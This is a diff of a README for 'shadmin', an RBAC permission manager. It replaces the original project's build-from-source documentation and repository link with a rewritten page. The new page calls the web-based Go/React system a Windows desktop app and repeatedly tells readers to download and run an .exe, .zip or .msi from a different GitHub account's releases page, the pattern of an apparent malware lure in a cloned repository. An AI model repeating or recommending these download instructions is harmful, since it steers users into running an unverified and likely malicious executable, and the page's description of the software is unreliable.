@@ -1,102 +1,187 @@
-<div align="center">
+# 🛡️ shadmin - Simple RBAC Access Control for Teams
 
-# Shadmin
+[![Download shadmin](https://img.shields.io/badge/Download%20shadmin-4C6FFF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Georginapoised916/shadmin/releases)
 
-**An Enterprise-Grade Full-Stack RBAC Permission Management System Built with Go + React**
+## 📦 Download
 
-[简体中文](./README.zh.md) · English
+Visit this page to download the Windows version:
+https://github.com/Georginapoised916/shadmin/releases
 
-![Shadmin Showcase](docs/images/showcase-dark-en.jpg)
+Pick the latest release, download the Windows file, then open it on your PC
 
-[![Go](https://img.shields.io/badge/Go-1.25+-00ADD8?logo=go&logoColor=white)](https://go.dev/)
-[![React](https://img.shields.io/badge/React-19-61DAFB?logo=react&logoColor=white)](https://react.dev/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5-3178C6?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+## 🧭 What shadmin does
 
-`Gin` · `Ent ORM` · `Casbin` · `Shadcn UI` · `TanStack Router` · `Tailwind CSS`
+shadmin is a desktop app for managing users, roles, and access rules in one place. It helps you keep track of who can see what inside your system.
 
-</div>
+Use it to:
 
----
+- Create and edit user roles
+- Set access rules for apps, pages, and actions
+- Review permission settings in a clear screen
+- Keep team access organized
+- Reduce manual access checks
 
-## ✨ Features
+## 💻 System requirements
 
-- 🏗️ **Clean Architecture** — Domain‑driven layered design (Controller → Usecase → Repository)
-- 🔐 **RBAC with Casbin** — Fine‑grained role‑based access control for APIs and menus
-- 🌗 **Light & Dark Themes** — Seamless theme switching with system preference detection
-- 📱 **Responsive Design** — Optimized for desktop, tablet, and mobile
-- 🔍 **Global Search** — Quick navigation across menus and resources
-- 📊 **Dashboard** — Data visualization with charts and statistics
-- 🗂️ **Dynamic Menus** — Backend‑driven menu tree with permission‑aware rendering
-- 🗄️ **Multi‑Database** — SQLite (default), PostgreSQL, MySQL out of the box
+Before you install shadmin, check that your PC meets these basic needs:
 
-## 🚀 Get Running
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 200 MB of free disk space
+- A mouse and keyboard
+- Internet access for the first download
 
-### Prerequisites
+For best use, close other large apps before you start the installer.
 
-- Go 1.25+
-- Node.js 18+ & pnpm (or npm)
+## 🚀 Getting Started
 
-### Run
+1. Open the download page  
+   https://github.com/Georginapoised916/shadmin/releases
 
-```bash
-# Clone the repository
-git clone https://github.com/ahaodev/shadmin.git
-cd shadmin
+2. Find the latest release  
+   Look for the newest version at the top of the page.
 
-# Install & build frontend
-cd web && pnpm install && pnpm build
+3. Download the Windows file  
+   Choose the file for Windows. It may end in `.exe` or come in a `.zip` file.
 
-# Start backend (from project root)
-# Generates Ent code, embeds web/dist/, listens on :55667
-# .env auto‑generated on first run
-cd ..
-go generate ./ent
-go run .
-```
+4. Open the file  
+   - If you downloaded an `.exe` file, double-click it.
+   - If you downloaded a `.zip` file, open it and extract the files first.
 
-> **Default login:** `admin` / `123`
+5. Follow the setup steps  
+   The installer will guide you through the process. Use the default options if you are not sure what to choose.
 
-## 🔐 Auth & Permissions
+6. Launch shadmin  
+   After setup, open the app from your Start menu or desktop shortcut.
 
-- **Authentication**: JWT access + refresh tokens via `Authorization: Bearer <token>`
-- **API Authorization**: Casbin middleware checks `(userID, path, method)` on protected routes
-- **Frontend Guards**: Permission‑aware components (`PermissionButton`, `PermissionGuard`)
-- **Menu System**: Dynamic menus from `/api/v1/resources`, auto‑adapted to user permissions
+## 🪟 How to install on Windows
 
-<details>
-<summary>📁 <b>Project Structure</b></summary>
+If the release comes as an installer:
 
-```
-shadmin/
-├── api/            # Controllers & routes (Gin)
-├── bootstarp/      # App bootstrap, DB, Casbin, seed
-├── domain/         # Entities, DTOs, interfaces
-├── ent/schema/     # Ent ORM schemas
-├── repository/     # Data access layer
-├── usecase/        # Business logic
-├── internal/       # Internal utilities
-├── pkg/            # Shared packages
-├── web/            # React frontend (Vite + shadcn/ui)
-│   └── src/
-│       ├── routes/       # TanStack file‑based routing
-│       ├── features/     # Feature modules
-│       ├── services/     # API wrappers (Axios)
-│       └── stores/       # Zustand state management
-├── docs/           # Documentation & images
-└── main.go         # Entry point
-```
+1. Double-click the installer file
+2. Click Next
+3. Choose the install folder, or keep the default path
+4. Click Install
+5. Click Finish
+6. Open shadmin from the Start menu
 
-</details>
+If the release comes as a ZIP file:
 
-## 📚 Documentation
+1. Right-click the ZIP file
+2. Select Extract All
+3. Pick a folder on your PC
+4. Open the extracted folder
+5. Double-click the app file inside
 
-- [Architecture (EN)](docs/getting-started/architecture.en.md) · [架构 (中文)](docs/getting-started/architecture.zh.md)
-- [Quick Start (EN)](docs/getting-started/quickstart.en.md) · [快速开始 (中文)](docs/getting-started/quickstart.zh.md)
-- [Development (EN)](docs/getting-started/development.en.md) · [开发指南 (中文)](docs/getting-started/development.zh.md)
-- [Deployment (EN)](docs/getting-started/deployment.en.md) · [部署 (中文)](docs/getting-started/deployment.zh.md)
+## 🔐 First-time setup
 
-## 📄 License
+When you open shadmin for the first time, you may need to:
 
-[MIT](LICENSE)
+- Create an admin account
+- Set a workspace name
+- Add your first users
+- Create roles such as Admin, Manager, and Viewer
+- Assign permissions to each role
 
+Use simple role names that match how your team works. Keep access rules short and clear.
+
+## 🧩 Main features
+
+### 👥 User management
+Add users, edit details, and group people by role. This helps you keep your team list clean.
+
+### 🛡️ Role-based access control
+Set access rules once, then apply them to many users. This saves time and keeps rules consistent.
+
+### 📋 Permission dashboard
+See who can access each part of your system. This makes review work easier.
+
+### ⚙️ Clean admin layout
+Move through users, roles, and permissions with a simple interface built for daily use.
+
+### 🔎 Fast search and filters
+Find accounts, roles, and access rules without sorting through long lists.
+
+### 🗂️ Team structure support
+Use shadmin for small teams or larger groups with more access layers.
+
+## 🛠️ How to use shadmin
+
+### Add a role
+1. Open the Roles screen
+2. Click Add Role
+3. Enter a name
+4. Save the role
+
+### Set permissions
+1. Open a role
+2. Choose the app area or feature
+3. Select the actions allowed for that role
+4. Save your changes
+
+### Add a user
+1. Open the Users screen
+2. Click Add User
+3. Enter the user name and email
+4. Assign a role
+5. Save the user
+
+### Review access
+1. Open the Permissions view
+2. Check the role list
+3. Confirm that each role has the right access
+4. Change any rule that does not fit your team
+
+## 🧠 Tips for smooth use
+
+- Keep role names short and clear
+- Start with a few basic roles
+- Review permissions after each change
+- Remove unused roles
+- Use one admin account for full access
+- Give users only the access they need
+
+## 🖥️ Common file types you may see
+
+You may see one of these files on the release page:
+
+- `.exe` for direct Windows install
+- `.zip` for a packed folder you need to extract
+- `.msi` for a Windows installer package
+
+If you are unsure which file to choose, pick the Windows installer file first.
+
+## ❓ Common questions
+
+### How do I get the app?
+Go to the releases page and download the latest Windows file.
+
+### Does it work on Windows?
+Yes. The release page is where you get the Windows version.
+
+### What is RBAC?
+RBAC means role-based access control. It lets you give access based on a person’s role.
+
+### Can I change permissions later?
+Yes. You can update roles and access rules at any time.
+
+### Is this for one user or a team?
+It works best for teams that need clear access control, but it can also help with personal admin tasks.
+
+## 📚 Project details
+
+- Name: shadmin
+- Type: Full-stack permission management system
+- Backend: Go
+- Frontend: React
+- UI tools: shadcn-ui, Tailwind CSS v4
+- State and table tools: TanStack
+- Data validation: Zod
+- App style: Clean admin layout with a structured screen flow
+
+## 🔗 Download again
+
+Visit the release page here:
+https://github.com/Georginapoised916/shadmin/releases
+
+Download the latest Windows file and run it on your PC
